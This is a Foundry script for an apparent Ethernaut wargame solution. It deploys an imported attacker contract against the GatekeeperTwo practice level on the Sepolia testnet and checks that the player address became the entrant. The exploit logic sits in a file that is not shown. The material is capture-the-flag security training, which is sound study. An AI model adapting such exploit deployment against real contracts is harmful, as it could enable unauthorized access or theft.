// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked14_GatekeeperTwo.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked14_GatekeeperTwoScript --broadcast
contract Cracked14_GatekeeperTwoScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("GatekeeperTwo_address"));
    }

    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));
        console.log("IGatekeeperTwo(ethernaut_contracts).entrant() is", IGatekeeperTwo(ethernaut_contracts).entrant());
        new Cracked14_GatekeeperTwo{salt: "Cracked14_GatekeeperTwo111"}(ethernaut_contracts);

        require(IGatekeeperTwo(ethernaut_contracts).entrant() == player, "FAIL");
        vm.stopBroadcast();
    }
}
